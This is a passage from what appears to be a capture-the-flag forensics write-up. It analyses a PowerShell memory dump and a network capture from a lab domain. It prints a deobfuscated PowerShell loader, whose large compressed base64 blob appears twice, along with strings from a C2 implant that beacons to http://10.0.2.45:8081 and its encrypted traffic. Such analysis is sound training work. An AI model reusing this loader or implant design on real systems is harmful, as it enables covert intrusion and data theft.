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'),[IO.Compression.CompressionMode]::Decompress));sv o (New-Object IO.MemoryStream);(gv d).Value.CopyTo((gv o).Value);[IO.File]::WriteAllBytes("$PWD\payload.bin", (gv o).Value.ToArray())
```

```html
System.Text
System.Security.Cryptography
op_Equality
op_Inequality
System.Net.Security
get_DefaultWebProxy
http://10.0.2.45:8081
VXNlci1BZ2VudA==,Q29va2ll
TW96aWxsYS81LjAgKFdpbmRvd3MgTlQgNi4xKSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvNDEuMC4yMjI4LjAgU2FmYXJpLzUzNy4zNg==,QVNQU0VTU0lPTklEPXtHVUlEfTsgU0VTU0lPTklEPTE1NTIzMzI5NzE3NTA=
L2VuLXVzL2luZGV4Lmh0bWw=,L2VuLXVzL2RvY3MuaHRtbA==,L2VuLXVzL3Rlc3QuaHRtbA==
i=a19ea23062db990386a3a478cb89d52e&data={0}&session=75db-99b1-25fe4e9afbe58696-320bea73
    <head>
        <title>Hello World!</title>
    </head>
    <body>
        <p>Hello World!</p>
        // Hello World! {0}
    </body>
56f236e520
l86TfRDvvJMtXWxr1PSoh1QlXHnZnLwn+wz+aYy3/s8=
{{"GUID":"{0}","Type":{1},"Meta":"{2}","IV":"{3}","EncryptedMessage":"{4}","HMAC":"{5}"}}
(?'group0'.*)
(?'group1'.*)
(?'group2'.*)
(?'group3'.*)
(?'group4'.*)
(?'group5'.*)
```

### powershell.DMP

using minidump to look though the dump.

```html
minidump.exe --peb powershell.dmp
```

```html
# minidump 0.0.24
# Author: Tamas Jos @skelsec (skelsecprojects@gmail.com)

PEB ADDR: 0xcc0246b000
BeingDebugged: 0
ImageBaseAddress: 0x7ff737180000
ProcessParameters: None
ImagePath: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
CommandLine: "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
WindowTitle: C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Windows PowerShell\Windows PowerShell.lnk
DllPath:
CurrentDirectory: C:\Users\Administrator\
StandardInput: 80
StandardOutput: 84
StandardError: 88
EnvironmentVariables:
        =::=::\
        ALLUSERSPROFILE=C:\ProgramData
        APPDATA=C:\Users\Administrator\AppData\Roaming
        CommonProgramFiles=C:\Program Files\Common Files
        CommonProgramFiles(x86)=C:\Program Files (x86)\Common Files
        CommonProgramW6432=C:\Program Files\Common Files
        COMPUTERNAME=WIN-SKOQ4PBDU0C
        ComSpec=C:\Windows\system32\cmd.exe
        DriverData=C:\Windows\System32\Drivers\DriverData
        FPS_BROWSER_APP_PROFILE_STRING=Internet Explorer
        FPS_BROWSER_USER_PROFILE_STRING=Default
        HOMEDRIVE=C:
        HOMEPATH=\Users\Administrator
        LOCALAPPDATA=C:\Users\Administrator\AppData\Local
        LOGONSERVER=\\WIN-SKOQ4PBDU0C
        NUMBER_OF_PROCESSORS=2
        OS=Windows_NT
        Path=C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Users\Administrator\AppData\Local\Microsoft\WindowsApps
        PATHEXT=.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC;.CPL
        PROCESSOR_ARCHITECTURE=AMD64
        PROCESSOR_IDENTIFIER=Intel64 Family 6 Model 158 Stepping 13, GenuineIntel
        PROCESSOR_LEVEL=6
        PROCESSOR_REVISION=9e0d
        ProgramData=C:\ProgramData
        ProgramFiles=C:\Program Files
        ProgramFiles(x86)=C:\Program Files (x86)
        ProgramW6432=C:\Program Files
        PSModulePath=C:\Users\Administrator\Documents\WindowsPowerShell\Modules;C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
        PUBLIC=C:\Users\Public
        SystemDrive=C:
        SystemRoot=C:\Windows
        TEMP=C:\Users\ADMINI~1\AppData\Local\Temp
        TMP=C:\Users\ADMINI~1\AppData\Local\Temp
        USERDNSDOMAIN=EVENTHORIZON.THM
        USERDOMAIN=EVENTHORIZON
        USERDOMAIN_ROAMINGPROFILE=EVENTHORIZON
        USERNAME=Administrator
        USERPROFILE=C:\Users\Administrator
        windir=C:\Windows
```

`ImagePath: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe` this confirms that this is a minidump of a powershell process.

```html

Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36
ASPSESSIONID={GUID}; SESSIONID=1552332971750
/en-us/index.html
/en-us/docs.html
/en-us/test.html
3DES TWO KEY
SSL3 SHAMD5
66666666666666666666666666666666
\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
<RSAKeyValue><Modulus>uu9b7lb3AED0j5r+qW4SDYlC0LZLPF5crPx9lkWafZZ+FDK2HuKnEtqjb9Xu8XEtc6Gb4dIi4DVGAjSKCpPBSvzrmBi/nqQbkuBVlzbv1l7lqZEYtL4z8N58YGrUuh2jeyKKtIfDJlUy5zT1Eer7xyKbykq8xP16tGXZe8Xb+oocmb72DPoH4mvnV1b+Q7JYE68gHSqgbOURy7jVecg8ragwdUNjvo3y2krQOdRRE/zuds+0I9abE26la+GnRw0C8qNnX4xGpoVlMiqiQoaiZoUSmODNkK7L3Ye6v++hM7Gyrl8fvbC5jlF7dSjjX9m/I1mZPkzrIbVk9cUdaWJVXQ==</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>
{"GUID":"56f236e5209dfaa53aaa","Type":0,"Meta":"","IV":"3TXOZma4otl1NPr7p2ZgBA==","EncryptedMessage":"utRoA9IflGpM5/2IFCIDpUmP5MF1bpMl2CvDUNUq+yLHke0SARWAiV238eWrk+5MGD2FacLEX8atWr0rOC67c2VeiM/OS+sS7a/jbPDfqmmWLFegK70oIdx1C9k7KIWTHyRqfwQm3uL+TvBB3FDRE0XkMntQ/qzfGVaCX/vmJdalHwoL7uMVbCCjDvshHyTLxAiAAeHuym8B+TCQAVBGD20iKofW1oqL8d87X+WGzj8CIQaGJB9ikxPoHHNpM3guoHZLBNlf7WU2iOzmMS19616G4mGYNMQWYM5OeW8AqNr+wesmzRXgLmAMHQJw0ygnnk83cZldYT+glEHnf/c6I+LDuXS3ypgSoFcwRy2tMWRfjZ21+25/5WBIA81AIxQuoJRwzDeBlaTwE3ddhLhX5OQeta6in15knA90csujIyTRGLn+ZVr+owBK727II2MIB15ppYCGTi/plQOw40NhdaxheNzliZ4FSATwIG7yzyNrNnYnqapEKH/iybK/7e4enNCSrZufAKjTlWsKA+A3ujgd55NAI1pLKZzhdcZNqYw=","HMAC":"nELRJWQ08zwcBum4C2VluRh3ynjg769Mc6Y7+Jk3Dj8="}
10.0.2.45:8081
10.0.2.45:8081
```

```html
{"GUID":"9dfaa53aaa","Type":1,"Meta":"","IV":"4CaBdaqBY5GHdc0+lKcyAA==","EncryptedMessage":"/tg1apIXcDGXxsuDBh3otAI1Xkdu5Y3f/nb0qArhJjLkEjgzP1zDcuxNmNYoe031NQowGCqz/VPa3o4OkuJ18vvX4W9RaL2A5fy9x8k0zOKImQMH5QN3zMNQAMsecBsRZC6M30n5bf2V/Frg/EwGk8OtSoxAuG3kvt8FkzxpPNkvqryEwRNsBPAwNU70ZhmcHpFzo5pLjZwgS79jXOnIHtE0I7jA3qfWDC8G1VcQB/rd4ccdnDGRco5IlHXwORh3N+hzmmaXkAPXbhs/wtKiotHFoPuzVDXR1HtePB5VP9VyXao30B+vMv4RASF4WCMaGO0lX4mC9PISi4UFU8lJBV/mwHZtVCs13fYOD8PlKhE=","HMAC":"pOZmCZymed+xew1CnRRIe5IXqOd4bOPKhQ8iPfl+3Hk="}
```

### Radius.ps1

i was able to extract the radius.ps1 file from the wireshark capture. 

<img width="1038" height="614" alt="image" src="https://github.com/user-attachments/assets/3a152341-576b-49b9-9609-38b380385391" />


once that was extracted and deobfuscating it .

```html
sv o (New-Object IO.MemoryStream);sv d (New-Object IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String('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'),[IO.Compression.CompressionMode]::Decompress));sv o (New-Object IO.MemoryStream);(gv d).Value.CopyTo((gv o).Value);[IO.File]::WriteAllBytes("$PWD\payload.bin", (gv o).Value.ToArray())
```

```html
System.Text
System.Security.Cryptography
op_Equality
op_Inequality
System.Net.Security
get_DefaultWebProxy
http://10.0.2.45:8081
VXNlci1BZ2VudA==,Q29va2ll
TW96aWxsYS81LjAgKFdpbmRvd3MgTlQgNi4xKSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvNDEuMC4yMjI4LjAgU2FmYXJpLzUzNy4zNg==,QVNQU0VTU0lPTklEPXtHVUlEfTsgU0VTU0lPTklEPTE1NTIzMzI5NzE3NTA=
L2VuLXVzL2luZGV4Lmh0bWw=,L2VuLXVzL2RvY3MuaHRtbA==,L2VuLXVzL3Rlc3QuaHRtbA==
i=a19ea23062db990386a3a478cb89d52e&data={0}&session=75db-99b1-25fe4e9afbe58696-320bea73
    <head>
        <title>Hello World!</title>
    </head>
    <body>
        <p>Hello World!</p>
        // Hello World! {0}
    </body>
56f236e520
l86TfRDvvJMtXWxr1PSoh1QlXHnZnLwn+wz+aYy3/s8=
{{"GUID":"{0}","Type":{1},"Meta":"{2}","IV":"{3}","EncryptedMessage":"{4}","HMAC":"{5}"}}
(?'group0'.*)
(?'group1'.*)
(?'group2'.*)
(?'group3'.*)
(?'group4'.*)
(?'group5'.*)
```

```html
{"GUID":"56f236e5209dfaa53aaa","Type":0,"Meta":"","IV":"3TXOZma4otl1NPr7p2ZgBA==","EncryptedMessage":"utRoA9IflGpM5/2IFCIDpUmP5MF1bpMl2CvDUNUq+yLHke0SARWAiV238eWrk+5MGD2FacLEX8atWr0rOC67c2VeiM/OS+sS7a/jbPDfqmmWLFegK70oIdx1C9k7KIWTHyRqfwQm3uL+TvBB3FDRE0XkMntQ/qzfGVaCX/vmJdalHwoL7uMVbCCjDvshHyTLxAiAAeHuym8B+TCQAVBGD20iKofW1oqL8d87X+WGzj8CIQaGJB9ikxPoHHNpM3guoHZLBNlf7WU2iOzmMS19616G4mGYNMQWYM5OeW8AqNr+wesmzRXgLmAMHQJw0ygnnk83cZldYT+glEHnf/c6I+LDuXS3ypgSoFcwRy2tMWRfjZ21+25/5WBIA81AIxQuoJRwzDeBlaTwE3ddhLhX5OQeta6in15knA90csujIyTRGLn+ZVr+owBK727II2MIB15ppYCGTi/plQOw40NhdaxheNzliZ4FSATwIG7yzyNrNnYnqapEKH/iybK/7e4enNCSrZufAKjTlWsKA+A3ujgd55NAI1pLKZzhdcZNqYw=","HMAC":"nELRJWQ08zwcBum4C2VluRh3ynjg769Mc6Y7+Jk3Dj8="}
```

```html
{"GUID":"9dfaa53aaa","Type":1,"Meta":"","IV":"unym2OOeefHNpgKNFlC9aw==","EncryptedMessage":"V6v6kF67Ap7ISjWVDYjb1w==","HMAC":"hrc1bargoia5M4oNSiTf/U68ldf0FEbXM3QVa837njA="}
{"GUID":"9dfaa53aaa","Type":2,"Meta":"","IV":"1D3jDmiQ6SoGlnL38Vl92Q==","EncryptedMessage":"UFsVDEFmOtiqgCQb+Cf0rA==","HMAC":"ymWMdFbZDV7SJiL/GMWr8lO+GyUZpp3lPOSz6/jlfUc="}
```

<img width="838" height="643" alt="image" src="https://github.com/user-attachments/assets/74b7fbef-a953-4f6a-914e-dceac5132eb5" />


this confirms the AES KEY 

### payload.bin file

<img width="715" height="65" alt="image" src="https://github.com/user-attachments/assets/57935993-77f5-4462-a2d3-78d964554f85" />

<img width="814" height="78" alt="image" src="https://github.com/user-attachments/assets/ac29f691-749f-42f2-b044-46fde8fe482c" />


```html
124573df9de2b4ed8b7973ff25d2b33a *payload.bin
```

using the hash of the file in virus total  

